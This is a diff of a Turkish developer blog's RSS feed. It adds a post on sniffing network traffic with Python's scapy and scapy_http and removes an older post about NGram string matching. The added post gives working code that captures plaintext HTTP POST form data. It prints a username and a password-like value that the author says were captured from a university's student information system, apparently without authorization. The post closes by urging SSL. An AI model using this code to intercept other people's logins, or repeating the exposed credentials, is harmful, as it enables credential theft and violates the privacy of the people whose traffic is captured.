@@ -7,6 +7,132 @@
     <atom:link href="https://aligoren.comhttps://aligoren.com/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Python ile Ağ Üzerinde İzleme Yapma</title>
+        <description>&lt;p&gt;Merhaba. Bu yazıda Python ile basit bir şekilde ağ üzerinde nasıl izleme yapılırı anlatmaya çalışıcam.
+Yazıya giriş yapmadan önce bazı gereksinimler mevcut. Bunlardan birisi &lt;code&gt;scapy&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Teknik detaylara giriş yapmadan önce açıklamak gerekirse scapy, network tarafında özelleştirilmiş paketler üretmeye yarayan bir kütüphane.&lt;/p&gt;
+
+&lt;p&gt;Kendisi açık kaynak kodlu bir yazılımdır. Scapy’nin diğerlerine göre farkı genişletilebilir oluşunda.
+Diğerleri demişken bunlardan benim bildikleri nmap ve hping var. İlla ki görmüşsünüzdür.&lt;/p&gt;
+
+&lt;p&gt;Ayrıca scapy interactive olarak ya da development kısmında da çalışabilir.
+Yani dilerseniz interactive shell ile çalışabilir ya da projenizde kütüphaneyi çağırabilirsiniz.&lt;/p&gt;
+
+&lt;h2 id=&quot;scapy-ve-scapy-http-kurulumu&quot;&gt;scapy ve scapy-http Kurulumu&lt;/h2&gt;
+
+&lt;p&gt;Çok uzatmayalım. Ben işlemleri linux dağıtımı üzerinde gerçekleştirdim. Kurulum iki aşamadan oluşuyor.
+Dağıtımınızda pip olduğunu varsayarak şu işlemleri gerçekleştirelim:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install python-scapy
+sudo pip install scapy_http
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Kurulum bu kadar Burada &lt;code&gt;scapy_http&lt;/code&gt; adında bir kütüphane kullandık.
+Kütüphane yazarı &lt;a href=&quot;http://www.lucainvernizzi.net&quot;&gt;Luca Invernizzi&lt;/a&gt; isimli abimizdir.&lt;/p&gt;
+
+&lt;h2 id=&quot;scapy-ile-a-trafiinin-zlenmesi&quot;&gt;scapy ile Ağ Trafiğinin İzlenmesi&lt;/h2&gt;
+
+&lt;p&gt;Yazı iki kısımdan oluşacak. Bu bir adresi kim yani hangi IP ziyaret ediyor ona bakacağız.&lt;/p&gt;
+
+&lt;p&gt;Öncelikle scapy ve scapy_http kütüphanesini dahil edelim:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from scapy.all import IP, sniff
+from scapy.layers import http
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Şimdi gelen değerleri sniffleyeceğimiz bir metod yazalım.
+Bu methoddan dönen değerlere göre sniffing işlemi yapacağız.&lt;/p&gt;
+
+&lt;p&gt;Bu metodda TCP paketlerini ayıklayacağız.
+Ayıklama işlemi esnasında herhangi bir şekilde HTTP isteğine denk gelirsek ekrana yazdıracağız.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    
+    #http katmanından geçen istekler
+    http_katmani = paket.getlayer(http.HTTPRequest)
+
+    # IP adresi içeren katman
+    ip_katmani = paket.getlayer(IP)
+    print '\n{0[src]} IP adresinden {1[Method]} {1[Host]}{1[Path]} sitesine ziyaret'.format(ip_katmani.fields, http_katmani.fields)
+
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Çıktı olarak şöyle görüntüleriz:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/posts/sniff_url.png&quot; alt=&quot;images/posts/sniff_url.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Buraya kadar olan kısım şu &lt;a href=&quot;http://www.lucainvernizzi.net/blog/2015/02/12/extracting-urls-from-network-traffic-in-just-9-python-lines-with-scapy-http/&quot;&gt;bağlantı&lt;/a&gt; üzerinden alıntılandı&lt;/p&gt;
+
+&lt;h2 id=&quot;scapy-ile-post-verilerinin-alnmas&quot;&gt;scapy ile POST Verilerinin Alınması&lt;/h2&gt;
+
+&lt;p&gt;Gelelim zurna mıdır nedir onun şey dediği yere.
+Ağ üzerinde herkesin merak ettiği bir diğer konu da internet sitelerine girişte parolaların alınıp alınamayacağıdır.&lt;/p&gt;
+
+&lt;p&gt;Yukarıdaki yapıya aşırı benzer bir şekilde POST değerlerini alabilirsiniz.
+Bu işlem SSL olan sistemlerde işe yaramıyor. Bunu belirtmem gerekir.
+Eğer SSL konusunda merakınız varsa tintinweb &lt;a href=&quot;https://github.com/tintinweb/scapy-ssl_tls&quot;&gt;reposuna&lt;/a&gt; bakmalısınız.&lt;/p&gt;
+
+&lt;p&gt;Post edilen verileri saf haliyla görebilmemizi sağlayan kodun temeli yukarıdaki ile aynı.
+Geri kalan kısım biraz programlama becerisi istiyor olay o kadar yani.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from scapy.all import IP, sniff
+from scapy.layers import http
+ 
+ 
+def tcp_ayikla(paket):
+    if not paket.haslayer(http.HTTPRequest):
+        # Eğer paket herhangi bir HTTP isteği almıyorsa burayı atlayalım:
+        return
+    http_katmani = paket.getlayer(http.HTTPRequest)
+    try:
+        # Gelen istek POST mu?
+        if str(http_katmani.fields[&quot;Method&quot;]) == &quot;POST&quot;:
+            
+            # Öyle ise dönen değeri böl ve bölünen değerin 13.sünü al
+            # 13. değer form değerlerinin geldiği kısım oluyor
+            data = str(http_katmani).split('\n')[13]
+            # Form değerleri birleşikti bildiğiniz GET query gibi
+            # Önce ampersand kaldırılıp, alt satıra geçme sağlandı
+            #   txtUserName=Falan
+            #   txtPassword=FalanPasswd
+            # Ardından Gelen değerdeki %40, yerini @ ifadesine bıraktı.
+            # Mail için önemli :)
+            data = data.replace('&amp;amp;', '\n').replace('%40', '@')
+            return data
+    except:
+        pass
+ 
+# Ağ üzerinde dinleme işlemine başlıyoruz:
+sniff(filter='tcp', prn=tcp_ayikla)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Bu ikinci kodun sonrasında çalıştırdığımızda aşağıdaki gibi bir çıktı ile karşılaşacağız.
+Dikkat ettiyseniz formda bulunan inputların name’leri ve value’ları bu ekranda görüntülenebilmekte&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;txt_username=16612261
+txt_password=cH10k1997GuVenL
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Yukarıdaki kullanıcı adı ve parola saf haliyle karşımıza sunulmakta.
+Parola her ne kadar ben güvenliyim imajı verse de izlemek pek de zor olmuyor.&lt;/p&gt;
+
+&lt;p&gt;Bu işlemi bir üniversitenin Öğrenci Bilgi Sistemi üzerinde gerçekleştirdim. Umarım problem olmaz :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;images/posts/post_sniffing.png&quot; alt=&quot;images/posts/post_sniffing.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sanırım bir anlatımın daha sonuna geldik. Özetle: SSL kullanın&lt;/p&gt;
+</description>
+        <pubDate>Sun, 23 Oct 2016 00:41:00 +0300</pubDate>
+        <link>https://aligoren.comhttps://aligoren.com/python-ile-ag-uzerinde-izleme-yapma</link>
+        <guid isPermaLink="true">https://aligoren.comhttps://aligoren.com/python-ile-ag-uzerinde-izleme-yapma</guid>
+      </item>
+    
+      <item>
         <title>Asp.Net MVC'De Çoklu Checkbox Kullanımı</title>
         <description>&lt;p&gt;Merhaba. Asp.NET ve özellikle MVC konusunda henüz yeniyim. Aslında MVC’den önce Asp.NET hiç kullanmadım. 
 Ancak iş olunca konu direkt MVC’ye daldım. Zorluk çektiğim pek söylenemez. Model kavramına aşina olduktan sonra pek sıkıntı yok.&lt;/p&gt;
@@ -715,73 +841,6 @@ END
         <pubDate>Wed, 03 Aug 2016 23:04:00 +0300</pubDate>
         <link>https://aligoren.comhttps://aligoren.com/sql-serverda-filtreli-arama-gerceklestirme</link>
         <guid isPermaLink="true">https://aligoren.comhttps://aligoren.com/sql-serverda-filtreli-arama-gerceklestirme</guid>
-      </item>
-    
-      <item>
-        <title>Python ve NGram Algoritması</title>
-        <description>&lt;p&gt;Bu yazıyı yazmadan önce google’da sayısızca arama yapıyordum. Beni çıldırtan bir olay oldu. Şimdi aradığım şey örneğin &lt;strong&gt;ahmet&lt;/strong&gt; tamam iyi hoş arıyorsun da. Gelip bana neden “Bunu mu denemek istediniz?” şeklinde soru soruyorsun. Neyse önerdiği şeye tıklıyorum. Hobaa. Eski yazdığımı öneriyor bu sefer.&lt;/p&gt;
-
-&lt;p&gt;Meselenin aslı şu. Ne yazmaya çalıştığımı nasıl olur da bilebilir ki google? Pek de bildiği söylenemez :P. Bu yazıda anlatmaya çalışacağım NGram tarzı bir algoritma kullandıkları kesin. Bakarsınız onlar tam da bunu kullanıyorlardır.&lt;/p&gt;
-
-&lt;p&gt;Bu işlem temelde “ali yanlış söyler, ahmet düzeltir” mantığına dayalı. Bunu gündelik hayatta yapmak, programlamada yapmaya göre daha basit. O yüzden bizim için bunu basitleştirecek olan &lt;a href=&quot;https://pypi.python.org/pypi/ngram&quot;&gt;ngram&lt;/a&gt; kütüphanesini kullanabiliriz.&lt;/p&gt;
-
-&lt;p&gt;#NGram Kütüphanesi Kurulumu&lt;/p&gt;
-
-&lt;p&gt;Kurulum basit şekilde&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;pip install ngram&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;komutu ile yapılıyor. İlk basit örneğimize geçelim:&lt;/p&gt;
-
-&lt;p&gt;Öncelikle ngram’ı import edelim:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from ngram import NGram
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Bu işlemi yaptıktan sonra ngram içerisine bir dizi değeri atamamız lazım. Örneğin programlama dillerinin kontrolünün yapılmasını istiyoruz:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;prog_dilleri = [&quot;php&quot;, &quot;python&quot;, &quot;csharp&quot;, &quot;cpp&quot;,
-                &quot;ruby&quot;, &quot;java&quot;, &quot;haskell&quot;, &quot;erlang&quot;]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Bu dillerin girili olması lazım. Burada yaptığımız şey &lt;strong&gt;harf bigramı&lt;/strong&gt; oluyor. Pekala öyleyse o zaman bu dilleri NGram ağacına ekleyelim. Yani aslında NGram nesnesine gönderiyoruz:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;v = NGram(prog_dilleri)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Çok basit şekilde ilerliyoruz. Dizi değerlerimiz artık NGram ağacına takılı durumda. Artık burada kendimize göre işlemler yapabiliriz. Bu işlemlerden birisi ise tahmin ettiğimiz gibi diller arasında arama yapmak ve en yakın olanını bulmak. O zaman bunu yapan bi metod oluşturalım.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;def arama(ara):
-    for i in v.search(ara, threshold=0.1):
-        print(&quot;Sonuç:&quot;, i[0])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Evet burada bakmamız gereken kısım &lt;code&gt;v.search()&lt;/code&gt; kısmı. search işlevi ilk argümanda kullanıcının atadığı değeri alır. Bu değer, daha önceden girili olan değerlere benzer mi değil mi kontrolü yapılır. Yani Örneğin &lt;strong&gt;prog_dilleri&lt;/strong&gt; dizisindeki python ile payton ne kadar benzer şeklinde sorar. Gelelim &lt;code&gt;threshold&lt;/code&gt; değerine. Bu değer girilen değerin, veritabanında yani NGram ağacındaki benzerine olan yakınlık durumunu sorgular. Bu yakınlık eşiğini kontrol için vardır. Genel itibariyle programımızın kodları şöyle:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from ngram import NGram
-
-prog_dilleri = [&quot;php&quot;, &quot;python&quot;, &quot;csharp&quot;, &quot;cpp&quot;,
-                &quot;ruby&quot;, &quot;java&quot;, &quot;haskell&quot;, &quot;erlang&quot;]
-
-v = NGram(prog_dilleri)
-
-def aramaYap(ara):
-    for i in v.search(ara, threshold=0.1):
-        print(&quot;Önerilen:&quot;, i[0], &quot;-- Yakınlık:&quot;, i[1], &quot;\n&quot;)
-
-aramaYap(&quot;payton&quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Programımızı çalıştırınca şöyle oluyor:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;Önerilen: python -- Yakınlık: 0.23076923076923078
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Evet bu kadardı arkadaşlar. İsterseniz NGram dokümanlarına &lt;a href=&quot;https://pythonhosted.org/ngram/ngram.html&quot;&gt;buradan&lt;/a&gt; ulaşabilirsiniz.&lt;/p&gt;
-</description>
-        <pubDate>Wed, 13 Apr 2016 22:44:00 +0300</pubDate>
-        <link>https://aligoren.comhttps://aligoren.com/python-ve-ngram-algoritmasi</link>
-        <guid isPermaLink="true">https://aligoren.comhttps://aligoren.com/python-ve-ngram-algoritmasi</guid>
       </item>
     
   </channel>
